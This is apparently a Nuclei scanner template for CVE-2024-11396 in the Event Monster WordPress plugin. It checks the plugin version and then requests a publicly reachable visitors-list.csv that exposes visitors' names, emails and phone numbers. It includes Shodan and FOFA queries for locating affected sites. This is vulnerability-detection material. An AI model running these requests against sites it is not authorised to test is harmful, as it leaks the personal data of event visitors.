flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body
    regex:
    - '(?mi)Stable tag: ([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - compare_versions(version, "<= 1.4.3")
    - contains(body, "event-monster")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /wp-content/plugins/event-monster/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(body, "First Name, Last Name, Email, Phone, Event")
    - contains(content_type, "text/csv")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /wp-content/uploads/visitors-list.csv HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-11396
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-11396
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-359
    epss-percentile: 0.97632
    epss-score: 0.48537
  description: 'The Event Monster Event Management, Tickets Booking, Upcoming Event
    plugin for WordPress is vulnerable to Information Exposure in all versions up
    to, and including, 1.4.3 via the Visitors List Export file. During the export,
    a CSV file is created in the wp-content folder with a hardcoded filename that
    is publicly accessible. This makes it possible for unauthenticated attackers to
    extract data about event visitors, that includes first and last names, email,
    and phone number.

    '
  impact: 'Unauthenticated attackers can access CSV files containing sensitive visitor
    information including names, emails, and phone numbers.

    '
  metadata:
    fofa-query: body="wp-content/plugins/event-monster"
    framework: wordpress
    max-request: 2
    product: event-monster
    shodan-query: http.html:"wp-content/plugins/event-monster"
    vendor: a-wp-life
    verified: true
  name: Event Monster <= 1.4.3 - Information Exposure Via Visitors List Export
  reference:
  - https://github.com/RandomRobbieBF/CVE-2024-11396
  - https://plugins.trac.wordpress.org/browser/event-monster/tags/1.4.3/em-ajax-prossesing/em-visitor-ajax.php#L92
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/0f522dfe-f2c2-4adb-980c-1f03d3c26e12?source=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2024-11396
  - https://github.com/advisories/GHSA-6x4w-fvqp-6jvc
  remediation: 'Update Event Monster plugin to a version newer than 1.4.3.

    '
  severity: medium
  tags: cve,cve2024,wordpress,wp,wp-plugin,event-monster,info-leak,passive,vuln
